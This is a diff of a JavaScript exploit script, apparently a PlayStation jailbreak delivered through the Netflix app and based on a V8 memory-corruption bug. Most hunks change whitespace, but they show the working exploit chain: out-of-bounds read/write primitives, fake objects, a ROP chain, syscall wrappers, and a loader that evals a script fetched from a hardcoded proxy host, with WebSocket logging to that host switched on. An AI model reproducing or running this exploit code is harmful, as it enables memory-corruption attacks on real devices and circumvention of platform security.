@@ -2,7 +2,7 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
-const ip_script = "PLS_STOP_HARDCODING_IPS"; // ip address of your computer running mitmproxy, MITM Proxy is handling it --> Needs to be updated
+const ip_script = "192.168.1.169"; // ip address of your computer running mitmproxy, MITM Proxy is handling it --> Needs to be updated
 const ip_script_port = 8080; //port that mitmproxy is on
 
 var is_ps4 = false; // Flag to stop execution after PS4 exploit loads
@@ -487,7 +487,7 @@ class gadgets {
                 break;
             case 'Gemini-U5-18':        // US 5.000
                 break;
-                
+
             case 'Pollux-U53-7-E':
             case 'Pollux-U53-7-A':
             case 'Pollux-U53-7-J':
@@ -515,10 +515,10 @@ class gadgets {
                 is_ps4 = true;
                 return; // Exit constructor, main() will check is_ps4 and return
             default:
-                
+
                 throw new Error("App version not supported");
-                
-                
+
+
         }
     }
     get(gadget) {
@@ -533,7 +533,7 @@ function hook_tryagain(){
             const original_changeLocation = util.changeLocation;
             util.changeLocation = function(url) {
                 logger.log("Reloading Javascript...");
-                
+
                 logger.flush();
 
                 // Load and eval our injected script instead of reloading app
@@ -616,7 +616,7 @@ function main () {
         map1.set(0x10, -1);
         nrdp.gibbon.garbageCollect();
         map1.set(oob_arr_temp, 0x200);
-        
+
 
         if (oob_arr_temp.lenght < 4) {
             throw new Error("Could not create unstable primitives. Try again.");
@@ -658,7 +658,7 @@ function main () {
             let original_value_26 = oob_arr[26];
 
             let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);
-            
+
             oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
             oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0
 
@@ -685,7 +685,7 @@ function main () {
 
             oob_arr[25] = original_value_25;
             oob_arr[26] = original_value_26;
-        }     
+        }
 
         function read32_unstable(add){
             let read = read64_unstable(add);
@@ -696,9 +696,9 @@ function main () {
             let read = read64_unstable(add);
             let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
             write64_unstable(add, new_value);
-        }      
-        
-        
+        }
+
+
         let add_string = addrof_unstable(string) + 12n;
         logger.log("Address of 'string' text: " + hex(add_string));
         let string_value = read32_unstable(add_string);
@@ -826,7 +826,7 @@ function main () {
         /***** fake_rop_arr buffer:     0x1700             *****/
         /***** fake_rop_arr elements:   0x1600             *****/
         /*******************************************************/
-       
+
         // Inside fake_rw_data: fake Array's elements (at the beginning)
         const fake_rw_obj =             base + 0x0000n;
         const fake_rw_obj_buffer =      base + 0x0040n;
@@ -1023,7 +1023,7 @@ function main () {
           write64(add, new_value);
         }
 
-        /***** The following primitives r/w a full 64bits Add *****/        
+        /***** The following primitives r/w a full 64bits Add *****/
 
         function read64_uncompressed (add) {
           let original_value = fake_rw[21];
@@ -1109,7 +1109,7 @@ function main () {
         //logger.log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
         add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
         add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
-        add_rop_smash_code_store = add_rop_smash_code + 0x22n;        
+        add_rop_smash_code_store = add_rop_smash_code + 0x22n;
 
         //logger.log("Address of fake_frame: 0x" + hex(base_heap_add + fake_frame) );
         //logger.log("Address of fake_bytecode: " + hex(base_heap_add + fake_bytecode) );
@@ -1139,7 +1139,7 @@ function main () {
                                                                       // this is gonna be offseted by R9
         write64(fake_frame  - 0x28n, 0x00n);                          // Force the value of R9 = 0
         write64(fake_frame  - 0x18n, 0xff00000000000000n);            // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
-                                                                          
+
         write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(fake_frame + 0x10n, rop_address);
 
@@ -1185,7 +1185,7 @@ function main () {
             fake_rop[i++] = 0x2000n;                   // Fake value in RAX to make JS happy
             fake_rop[i++] = g.get('pop_rsp_pop_rbp');
             fake_rop[i++] = real_rbp;
-            
+
             write64(add_rop_smash_code_store, 0xab00260325n);
             fake_rw[59] = (fake_frame & 0xffffffffn); // Only 32 bits needed
             rop_smash(fake_obj_arr[0]);               // Call ROP
@@ -1250,7 +1250,7 @@ function main () {
 
         const mod_info = malloc(0x300);
         const SEGMENTS_OFFSET = 0x160n;
-        
+
         ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
         logger.log("sceKernelGetModuleInfoFromAddr returned: " + hex(ret));
 
@@ -1258,24 +1258,24 @@ function main () {
             logger.log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + hex(ret));
             throw new Error("sceKernelGetModuleInfoFromAddr failed");
         }
-        
+
         /***** LibKernel *****/
         libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
         logger.log("libkernel_base @ " + hex(libkernel_base));
         logger.flush();
 
-        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) 
-        {            
+        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n)
+        {
             call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
             return read64(fake_rop_return);
         }
 
-        function write_string(addr, str) {            
+        function write_string(addr, str) {
             let bytes = stringToBytes(str);
             for (let i = 0; i < str.length; i++) {
                 write8_uncompressed(addr + BigInt(i), bytes[i]);
             }
-            
+
             write8_uncompressed(addr + BigInt(str.length), 0);
         }
 
@@ -1285,9 +1285,9 @@ function main () {
             for (let i = 0; i < str.length; i++) {
                 write8_uncompressed(addr + BigInt(i), bytes[i]);
             }
-            
+
             write8_uncompressed(addr + BigInt(str.length), 0);
-            
+
             return addr;
         }
 
@@ -1295,29 +1295,29 @@ function main () {
             const notify_buffer_size = 0xc30n;
             const notify_buffer = malloc(Number(notify_buffer_size));
             const icon_uri = "cxml://psnotification/tex_icon_system";
-                                
+
             // Setup notification structure
             write32_uncompressed(notify_buffer + 0x0n, 0);           // type
             write32_uncompressed(notify_buffer + 0x28n, 0);          // unk3
             write32_uncompressed(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
             write32_uncompressed(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
-            
+
             // Write message at offset 0x2D
             write_string(notify_buffer + 0x2dn, text);
-            
+
             // Write icon URI at offset 0x42D
             write_string(notify_buffer + 0x42dn, icon_uri);
-            
+
             // Open /dev/notification0
             const dev_path = alloc_string("/dev/notification0");
             const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
-            
+
             if (Number(fd) < 0) {
                 return;
             }
-            
+
             syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
-            syscall(SYSCALL.close, fd);  
+            syscall(SYSCALL.close, fd);
         }
 
         send_notification("ð\x9F¥³ð\x9F¥³ Netflix-n-Hack ð\x9F¥³ð\x9F¥³");
@@ -1469,27 +1469,27 @@ function main () {
             if (cur_uid === 0n && is_in_sandbox === 0n) {
                 return true;
             } else {
-                
+
                 // Check if elfldr is running at 9021
                 const sockaddr_in = malloc(16);
                 const enable = malloc(4);
-                
+
                 const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
                 if (sock_fd === 0xffffffffffffffffn) {
                     throw new Error("socket failed: " + hex(sock_fd));
                 }
-            
+
                 try {
                     write32_uncompressed(enable, 1);
                     syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
-            
+
                     write8_uncompressed(sockaddr_in + 1n, AF_INET);
                     write16_uncompressed(sockaddr_in + 2n, 0x3D23n);      // port 9021
                     write32_uncompressed(sockaddr_in + 4n, 0x0100007Fn);  // 127.0.0.1
-            
+
                     // Try to connect to 127.0.0.1:9021
                     const ret = syscall(SYSCALL.connect, sock_fd, sockaddr_in, 16n);
-            
+
                     if (ret === 0n) {
                         syscall(SYSCALL.close, sock_fd);
                         return true;
@@ -1531,15 +1531,15 @@ function main () {
             const buf = malloc(0x8);
             const size = malloc(0x8);
             write64_uncompressed(size, 0x8n);
-            
+
             if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
                 const byte1 = Number(read8_uncompressed(buf + 2n));  // Minor version (first byte)
                 const byte2 = Number(read8_uncompressed(buf + 3n));  // Major version (second byte)
-                
+
                 const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
                 return version;
             }
-            
+
             return null;
         }
 
@@ -1559,13 +1559,13 @@ function main () {
 
             if (script.trim().startsWith("<")) {
                 let errorMsg = "get_script returned HTML instead of JS (likely a 404 error). First 50 chars: " + script.substring(0, 50);
-                logger.log(errorMsg); 
+                logger.log(errorMsg);
                 logger.flush();
-                return; 
+                return;
             }
 
             let jbPromise = eval(script);
-            
+
             if (jbPromise && typeof jbPromise.then === 'function') {
                 jbPromise.then(() => {
                     logger.flush();
@@ -1600,5 +1600,5 @@ function main () {
     }
 }
 
-//ws.init(ip_script, 1337, () => { logger.log("Websocket initiated successfully"); main();});// uncomment this to enable WebSocket logging
+ws.init(ip_script, 1337, () => { logger.log("\n\n\nWebsocket initiated successfully!"); main();});// uncomment this to enable WebSocket logging
 main();
